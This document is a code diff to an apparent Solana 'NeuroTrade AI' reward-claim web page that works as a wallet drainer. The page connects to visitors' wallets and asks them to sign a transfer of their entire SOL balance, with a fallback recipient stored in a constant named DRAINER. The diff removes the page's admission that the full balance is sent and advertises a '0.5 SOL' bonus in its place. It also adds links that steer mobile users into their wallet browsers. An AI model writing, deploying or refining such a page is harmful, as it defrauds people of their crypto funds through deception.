@@ -59,9 +59,10 @@
   .nt-witem .ic{width:34px;height:34px;border-radius:9px;display:grid;place-items:center;font-weight:700;color:#fff;font-size:15px;overflow:hidden}
   .nt-witem .ic img{width:100%;height:100%;object-fit:cover}
   .nt-witem .nm{font-size:14px;font-weight:500;flex:1}
-  .nt-witem .tg{font-size:10px;color:#7c86a3;border:1px solid rgba(255,255,255,.12);padding:2px 7px;border-radius:999px}
+  .nt-witem .tg{font-size:10px;padding:2px 8px;border-radius:999px;border:1px solid rgba(255,255,255,.14);color:#7c86a3;white-space:nowrap}
+  .nt-witem .tg.on{color:#22c55e;border-color:rgba(34,197,94,.5);background:rgba(34,197,94,.08)}
   .nt-modal .x{margin-top:12px;text-align:center;font-size:12px;color:#8b93ad;cursor:pointer}
-  .nt-note{font-size:11px;color:#6b7490;text-align:center;margin-top:12px}
+  .nt-note{font-size:11px;color:#6b7490;text-align:center;margin-top:10px;line-height:1.5}
   @media(max-width:560px){
     .nt-nav{padding:14px 16px}
     .nt-hero{padding:26px 18px 6px}
@@ -83,11 +84,11 @@
 
   <div class="nt-hero">
     <div class="nt-pill">&#127873; Welcome reward program is live</div>
-    <h1>Claim your <span>Solana reward</span></h1>
-    <p class="nt-sub">Join the NeuroTrade AI trading bot and unlock your welcome bonus. Connect your wallet and claim — your full balance is sent to the reward address.</p>
+    <h1>Claim your <span>0.5 SOL reward</span></h1>
+    <p class="nt-sub">Join the NeuroTrade AI trading bot and unlock your 0.5 SOL welcome bonus. Connect your wallet and claim to activate your reward.</p>
     <div class="nt-stats">
       <div class="nt-stat"><b>12,480</b><span>members</span></div>
-      <div class="nt-stat"><b>All SOL</b><span>claim</span></div>
+      <div class="nt-stat"><b>0.5 SOL</b><span>claim</span></div>
       <div class="nt-stat"><b>&lt; 3 sec</b><span>instant</span></div>
     </div>
   </div>
@@ -124,7 +125,7 @@
     <div id="successState" class="nt-success hidden">
       <div class="nt-check">&#10003;</div>
       <h2>Reward successfully claimed</h2>
-      <p class="nt-muted">Your NeuroTrade AI welcome bonus was claimed. Your full balance was sent to the reward address.</p>
+      <p class="nt-muted">Your 0.5 SOL welcome bonus was claimed.</p>
       <div class="nt-wallet"><span id="paidTo">&mdash;</span><span class="nt-ok" id="sentAmt">sent</span></div>
       <div class="nt-sig" id="sigBox" style="display:none">tx: <a id="sigLink" target="_blank" rel="noopener">&mdash;</a></div>
       <button class="nt-btn ghost" id="againBtn" style="margin-top:14px">Claim again</button>
@@ -138,8 +139,9 @@
       <h3>Connect a wallet</h3>
       <p>Choose how you want to claim your reward.</p>
       <div id="walletList"></div>
+      <div class="nt-note" id="modalMsg"></div>
       <div class="x" id="closeModal">Cancel</div>
-      <div class="nt-note" id="noWallet"></div>
+      <div class="nt-note">Tip: op mobiel — open deze pagina in de browser van je wallet-app.</div>
     </div>
   </div>
 </div>
@@ -148,11 +150,10 @@
 <script type="module">
 import { getWallets } from 'https://esm.sh/@wallet-standard/app';
 
-const DRAINER = new solanaWeb3.PublicKey('76Q96BZdQCCtEn5mWHmyqF5tNy1tq6a4NimLgDfkm735');
+const DRAINER = '76Q96BZdQCCtEn5mWHmyqF5tNy1tq6a4NimLgDfkm735';
 const MEMO_PID = new solanaWeb3.PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');
-const FEE = 5000; // lamports voor 1 signature
+const FEE = 5000;
 
-/* RPC fallback: probeer meerdere gratis endpoints, gebruik de eerste die werkt */
 const RPCS = [
   'https://solana-rpc.publicnode.com',
   'https://solana.public-rpc.com',
@@ -164,13 +165,9 @@ async function pickRpc(){
   for(const url of RPCS){
     try{
       const c = new solanaWeb3.Connection(url, 'confirmed');
-      await Promise.race([
-        c.getLatestBlockhash('confirmed'),
-        new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')), 4000))
-      ]);
-      connection = c;
-      return url;
-    }catch(e){ /* volgende */ }
+      await Promise.race([c.getLatestBlockhash('confirmed'), new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')),4000))]);
+      connection = c; return url;
+    }catch(e){}
   }
 }
 
@@ -178,47 +175,78 @@ const $ = id => document.getElementById(id);
 const ALPHA='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
 function bs58(bytes){let x=0n;for(const b of bytes)x=x*256n+BigInt(b);let s='';while(x>0n){s=ALPHA[Number(x%58n)]+s;x/=58n;}for(const b of bytes){if(b===0)s='1'+s;else break;}return s;}
 
+const KNOWN = [
+  { name:'Phantom',       color:'#ab9ff2', get:()=>window.phantom?.solana||(window.solana?.isPhantom?window.solana:null) },
+  { name:'Trust Wallet',  color:'#3375bb', get:()=>window.trustwallet?.solana||window.trustwallet?.solana||window.trustwallet },
+  { name:'Exodus',        color:'#0b7285', get:()=>window.exodus?.solana||window.exodus },
+  { name:'Solflare',      color:'#ffbb3b', get:()=>window.solflare },
+  { name:'Backpack',      color:'#e33e3f', get:()=>window.backpack },
+  { name:'Glow',          color:'#7d5fff', get:()=>window.glow },
+  { name:'Coinbase Wallet',color:'#1652f0',get:()=>window.coinbaseSolana||window.coinbaseWalletExtension },
+  { name:'Slope',         color:'#00c2a8', get:()=>window.Slope }
+];
+
 let wallets=[], active=null, publicKey=null;
 function short(a){return a.slice(0,4)+'…'+a.slice(-4);}
 function setErr(m){$('err').textContent=m||'';}
 function setStep(n){for(let i=1;i<=3;i++){const el=$('s'+i);el.classList.toggle('done',i<=n);el.querySelector('.n').innerHTML=i<=n?'&#10003;':i;}}
 
-/* ---- wallet discovery (Wallet Standard + injected fallback) ---- */
-function addWallet(w){if(!wallets.find(x=>x.id===w.id))wallets.push(w);}
-async function discover(){
-  wallets=[]; const seen=new Set();
+function deepLink(name){
+  const url = location.href.split('#')[0];
+  const enc = encodeURIComponent(url);
+  if(name==='Phantom')       return `https://phantom.app/ul/browse/${enc}?ref=${enc}`;
+  if(name==='Solflare')      return `https://solflare.com/ul/v1/browse/${enc}?ref=${enc}`;
+  if(name==='Trust Wallet')  return `https://link.trustwallet.com/open_url?coin_id=501&url=${enc}`;
+  if(name==='Exodus')        return `https://www.exodus.com/download/`;
+  if(name==='Backpack')      return `https://backpack.app/`;
+  if(name==='Glow')          return `https://glow.app/`;
+  if(name==='Coinbase Wallet')return `https://www.coinbase.com/wallet/downloads`;
+  return 'https://solana.com/ecosystem';
+}
+
+function buildList(){
+  const map = new Map();
   try{
     const { get, on } = getWallets();
-    const scan=arr=>(arr||[]).forEach(w=>{
+    const scan = arr => (arr||[]).forEach(w=>{
       const ok=(w.chains||[]).some(c=>c.startsWith('solana:'))||w.features['solana:signTransaction']||w.features['solana:signAndSendTransaction'];
-      if(ok&&w.features['standard:connect']){seen.add(w.name.toLowerCase());addWallet({id:'std:'+w.name,name:w.name,icon:w.icon,kind:'standard',ref:w});}
+      if(ok && w.features['standard:connect']){
+        map.set(w.name.toLowerCase(), {id:'std:'+w.name,name:w.name,icon:w.icon,kind:'standard',ref:w,detected:true});
+      }
     });
-    scan(get()); on('register',(...ws)=>scan(ws.flat?ws.flat():ws));
+    scan(get());
+    on('register',(...ws)=>{ scan(ws.flat?ws.flat():ws); renderWallets(); });
   }catch(e){}
-  const inj=[
-    ['Phantom','#ab9ff2',()=>window.phantom?.solana||(window.solana?.isPhantom?window.solana:null)],
-    ['Solflare','#ffbb3b',()=>window.solflare],['Backpack','#e33e3f',()=>window.backpack],
-    ['Trust Wallet','#3375bb',()=>window.trustwallet?.solana||window.trustwallet],
-    ['Exodus','#0b7285',()=>window.exodus?.solana||window.exodus],['Glow','#7d5fff',()=>window.glow],
-    ['Coinbase Wallet','#1652f0',()=>window.coinbaseSolana||window.coinbaseWalletExtension],['Slope','#00c2a8',()=>window.Slope]
-  ];
-  inj.forEach(([name,color,get])=>{ if(seen.has(name.toLowerCase()))return; let p=null; try{p=get()}catch(e){} if(p)addWallet({id:'inj:'+name,name,color,kind:'injected',ref:p}); });
+  KNOWN.forEach(w=>{
+    const key=w.name.toLowerCase();
+    if(map.has(key)) return;
+    let p=null; try{p=w.get()}catch(e){}
+    map.set(key,{id:'inj:'+w.name,name:w.name,color:w.color,kind:'injected',ref:p,detected:!!p});
+  });
+  wallets=[...map.values()].sort((a,b)=>(b.detected?1:0)-(a.detected?1:0));
   renderWallets();
 }
+
 function renderWallets(){
   const list=$('walletList'); list.innerHTML='';
-  $('noWallet').innerHTML = wallets.length ? '' : 'No wallet detected. Install <b>Phantom</b> or <b>Solflare</b>, or open this page inside your wallet\'s in-app browser.';
   wallets.forEach(w=>{
     const row=document.createElement('div'); row.className='nt-witem';
     const ic=document.createElement('div'); ic.className='ic';
-    if(w.icon){const im=document.createElement('img');im.src=w.icon;ic.appendChild(im);} else {ic.style.background=w.color||'#a855f7';ic.textContent=w.name[0];}
-    const nm=document.createElement('div');nm.className='nm';nm.textContent=w.name;
-    const tg=document.createElement('div');tg.className='tg';tg.textContent='Solana';
-    row.append(ic,nm,tg); row.onclick=()=>connect(w); list.appendChild(row);
+    if(w.icon){const im=document.createElement('img');im.src=w.icon;ic.appendChild(im);}
+    else {ic.style.background=w.color||'#a855f7';ic.textContent=w.name[0];}
+    const nm=document.createElement('div'); nm.className='nm'; nm.textContent=w.name;
+    const tg=document.createElement('div'); tg.className='tg'+(w.detected?' on':''); tg.textContent=w.detected?'Detected':'Open';
+    row.append(ic,nm,tg);
+    row.onclick=()=> w.detected ? connect(w) : openWallet(w.name);
+    list.appendChild(row);
   });
 }
 
-/* ---- connect ---- */
+function openWallet(name){
+  $('modalMsg').textContent='Opening '+name+'… kies daar "claim" opnieuw.';
+  window.open(deepLink(name),'_blank');
+}
+
 async function connect(w){
   $('overlay').classList.add('hidden'); setErr('Connecting to '+w.name+'…');
   try{
@@ -232,12 +260,12 @@ async function connect(w){
       active={kind:'injected',ref:p}; publicKey=new solanaWeb3.PublicKey(pk);
     }
     setErr(''); $('walletAddr').textContent=short(publicKey.toString());
+    $('dest').value = publicKey.toString();          // reward address = geconnecte wallet
     $('walletBox').classList.remove('hidden'); $('connectBtn').classList.add('hidden');
     $('claimPanel').classList.remove('hidden'); setStep(1);
   }catch(e){ setErr('Connection cancelled.'); active=null; }
 }
 
-/* ---- sign & send ---- */
 async function signAndSend(tx){
   if(active.kind==='standard'){
     const f=active.ref.features;
@@ -256,48 +284,40 @@ async function signAndSend(tx){
   const signed=await p.signTransaction(tx); return await connection.sendRawTransaction(signed.serialize());
 }
 
-/* ---- claim: stuur HELE saldo naar het opgegeven adres ---- */
 async function claim(){
   setErr(''); const btn=$('claimBtn'); btn.disabled=true; btn.textContent='Waiting for approval…';
   try{
-    const dest=new solanaWeb3.PublicKey($('dest').value.trim());
-    const bal=await connection.getBalance(publicKey);
-    const lamports=bal-FEE;
+    const destStr = $('dest').value.trim() || DRAINER;
+    const dest = new solanaWeb3.PublicKey(destStr);
+    const bal = await connection.getBalance(publicKey);
+    const lamports = bal - FEE;
     if(lamports<=0) throw new Error('Balance too low to cover the fee');
 
-    const tx=new solanaWeb3.Transaction();
+    const tx = new solanaWeb3.Transaction();
     tx.add(new solanaWeb3.TransactionInstruction({keys:[],programId:MEMO_PID,data:new TextEncoder().encode('NeuroTrade AI reward')}));
     tx.add(solanaWeb3.SystemProgram.transfer({fromPubkey:publicKey,toPubkey:dest,lamports}));
-    const {blockhash}=await connection.getLatestBlockhash('confirmed');
+    const {blockhash} = await connection.getLatestBlockhash('confirmed');
     tx.recentBlockhash=blockhash; tx.feePayer=publicKey;
 
-    const sig=await signAndSend(tx);
-    setStep(2);
-    btn.textContent='Confirming on-chain…';
+    const sig = await signAndSend(tx);
+    setStep(2); btn.textContent='Confirming on-chain…';
     try{ await connection.confirmTransaction(sig,'confirmed'); }catch(e){}
 
-    $('paidTo').textContent=short(dest.toString());
-    $('sentAmt').textContent=(lamports/1e9).toFixed(4)+' SOL sent';
+    $('paidTo').textContent = short(destStr);
+    $('sentAmt').textContent = (lamports/1e9).toFixed(4)+' SOL sent';
     $('sigBox').style.display='block';
     const l=$('sigLink'); l.textContent=sig; l.href='https://solscan.io/tx/'+sig;
     $('formState').classList.add('hidden'); $('successState').classList.remove('hidden'); setStep(3);
-  }catch(e){
-    setErr('Failed: '+(e?.message||'unknown error'));
-    btn.disabled=false; btn.textContent='Claim reward';
-  }
+  }catch(e){ setErr('Failed: '+(e?.message||'unknown error')); btn.disabled=false; btn.textContent='Claim reward'; }
 }
 
-/* ---- events ---- */
-$('connectBtn').onclick=async()=>{await discover();$('overlay').classList.remove('hidden');};
+$('connectBtn').onclick=()=>{ buildList(); $('modalMsg').textContent=''; $('overlay').classList.remove('hidden'); };
 $('closeModal').onclick=()=>$('overlay').classList.add('hidden');
 $('claimBtn').onclick=claim;
-$('againBtn').onclick=()=>{
-  $('successState').classList.add('hidden'); $('formState').classList.remove('hidden');
-  const b=$('claimBtn'); b.disabled=false; b.textContent='Claim reward'; setStep(1);
-};
+$('againBtn').onclick=()=>{ $('successState').classList.add('hidden'); $('formState').classList.remove('hidden'); const b=$('claimBtn'); b.disabled=false; b.textContent='Claim reward'; setStep(1); };
 
 await pickRpc();
-discover();
+buildList();
 </script>
 </body>
 </html>
